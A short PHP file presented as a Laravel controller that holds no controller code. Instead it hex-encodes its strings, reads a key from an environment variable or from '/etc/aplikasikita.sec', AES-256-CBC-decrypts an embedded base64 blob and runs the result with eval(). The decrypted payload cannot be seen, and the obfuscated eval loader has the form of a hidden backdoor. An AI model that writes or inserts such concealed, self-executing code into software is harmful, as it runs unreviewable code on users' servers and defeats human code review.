<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('aUlcl+11pS7zSVm5J72ujg==');

$c=base64_decode(

'80N/EvOgZy+f2kUBHrla8df/ISWXw5H90w+aZ/m7eVTl41IHYL10Pf3VgUEhsomILGIbMrxYp37j' .
'Nhz3i7Gyjuft3XlIELLty6iCPxkJxZ9KisUo/ZMneI5Ea8jabPdDL8hNO0eMVIl9+ZsYFb/VGkZv' .
'oxpjf9Vkw0BZEFdc+T1KpS4YUwHSoYJtM5RhnuWvZGKvfdbuZe7tCcaaa7rL48/hE0mZIYKyt85e' .
'CjVMdjErmzF0WeZ9YmFiqCQFauam'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

